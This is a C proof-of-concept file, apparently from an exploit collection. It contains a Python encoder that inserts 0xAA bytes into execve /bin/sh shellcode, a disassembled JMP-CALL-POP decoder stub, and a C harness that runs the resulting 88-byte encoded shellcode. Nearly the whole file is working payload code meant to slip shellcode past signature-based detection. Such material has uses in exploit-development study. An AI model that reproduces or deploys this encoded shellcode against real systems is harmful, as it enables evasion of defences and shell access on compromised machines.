/*
'''
; Date: 07/03/2019
; Insertion-Encoder.asm
; Author: Daniele Votta
; Description: This program encode shellcode with insertion technique (0xAA).
; Tested on: i686 GNU/Linux
'''

#!/usr/bin/python
# Python Insertion Encoder

import random

# Execve /bin/sh (25 bytes)
shellcode =("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode...'

for x in bytearray(shellcode):
	# Insertion Encoding
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA
	# encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % 0xAA
	# encoded2 += '0x%02x' % random.randint(1,255)

print encoded +"\n"
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
*/

#include<stdio.h>
#include<string.h>

/*
; Insertion-Decoder.asm
; Author: Daniele Votta
; Description: This program decode shellcode with insertion technique (0xAA).
; Tested on: i686 GNU/Linux
; Shellcode Length:50
; JMP | CALL | POP | Techniques

Insertion-Decoder:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080:	eb 1d                	jmp    804809f <call_decoder>

08048082 <decoder>:
 8048082:	5e                   	pop    esi
 8048083:	8d 7e 01             	lea    edi,[esi+0x1]
 8048086:	31 c0                	xor    eax,eax
 8048088:	b0 01                	mov    al,0x1
 804808a:	31 db                	xor    ebx,ebx

0804808c <decode>:
 804808c:	8a 1c 06             	mov    bl,BYTE PTR [esi+eax*1]
 804808f:	80 f3 aa             	xor    bl,0xaa
 8048092:	75 10                	jne    80480a4 <EncodedShellcode>
 8048094:	8a 5c 06 01          	mov    bl,BYTE PTR [esi+eax*1+0x1]
 8048098:	88 1f                	mov    BYTE PTR [edi],bl
 804809a:	47                   	inc    edi
 804809b:	04 02                	add    al,0x2
 804809d:	eb ed                	jmp    804808c <decode>

0804809f <call_decoder>:
 804809f:	e8 de ff ff ff       	call   8048082 <decoder>

080480a4 <EncodedShellcode>:
 80480a4:	31 aa c0 aa 50 aa    	xor    DWORD PTR [edx-0x55af5540],ebp
 80480aa:	68 aa 2f aa 2f       	push   0x2faa2faa
 80480af:	aa                   	stos   BYTE PTR es:[edi],al
 80480b0:	73 aa                	jae    804805c <_start-0x24>
 80480b2:	68 aa 68 aa 2f       	push   0x2faa68aa
 80480b7:	aa                   	stos   BYTE PTR es:[edi],al
 80480b8:	62 aa 69 aa 6e aa    	bound  ebp,QWORD PTR [edx-0x55915597]
 80480be:	89 aa e3 aa 50 aa    	mov    DWORD PTR [edx-0x55af551d],ebp
 80480c4:	89 aa e2 aa 53 aa    	mov    DWORD PTR [edx-0x55ac551e],ebp
 80480ca:	89 aa e1 aa b0 aa    	mov    DWORD PTR [edx-0x554f551f],ebp
 80480d0:	0b aa cd aa 80 aa    	or     ebp,DWORD PTR [edx-0x557f5533]
 80480d6:	bb                   	.byte 0xbb
 80480d7:	bb                   	.byte 0xbb
[+] Extract Shellcode ...
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb"

======================= POC Daniele Votta =======================
*/

/* Insertion Encoded Execve /bin/sh (88 bytes) */
unsigned char code[] = \
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}